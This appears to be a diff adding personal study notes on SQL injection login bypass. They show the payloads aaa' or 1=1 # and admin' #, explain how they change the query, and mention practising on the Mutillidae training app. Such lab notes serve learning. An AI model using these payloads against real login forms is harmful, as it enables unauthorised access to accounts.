@@ -1,0 +1,13 @@
+select * from accounts where username = 'admin' and password='aaa' 
+
+we can insert in the password field just aaa' or 1=1 # 
+after writing this it will be always true because after or we have 1=1 #
+
+there is another way to inject 
+# means after that it considers to be commented 
+
+select * from accounts where username = 'admin' #' and password = '$password'
+
+we insert in admin' #
+
+this happens with mutilldae by giving the ip/mutilldae/index.php
